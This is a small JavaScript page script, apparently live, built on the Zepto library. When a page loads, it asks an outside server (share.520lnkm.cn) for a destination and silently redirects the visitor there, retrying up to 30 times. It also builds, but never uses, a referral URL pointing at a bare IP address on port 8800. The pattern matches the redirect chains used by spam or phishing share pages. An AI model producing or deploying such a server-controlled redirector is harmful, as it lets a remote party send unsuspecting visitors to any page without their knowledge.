Zepto(function ($) {
    var goTime = 0;
    var keyurl = window.location.href;
	var nextUrl2 = "http://119.29.8.160:8800/index2";
    var nextUrl1 = nextUrl2;
	
	//获取code
	var patt = new RegExp('http://([a-zA-Z_0-9]+)\.');
	var ret = keyurl.match(patt);
	var OssCode = ret[1];
	var referurl = nextUrl1 + "?refer=" + keyurl;
    // console.log(OssCode);
	console.log(referurl);

    function ajaxGoNext(url) {
        goTime++;
        $.ajax({
            type: "GET", url: "http://share.520lnkm.cn/", success: function (msg) {
                console.log(msg);
                //document.write(msg);
                //document.close()
                window.location.href = msg;
            }, error: function (XMLHttpRequest, textStatus, errorThrown) {
                if (goTime < 30) {
                 ajaxGoNext(nextUrl1)
                }
            }
        })
    }

    ajaxGoNext(referurl)

})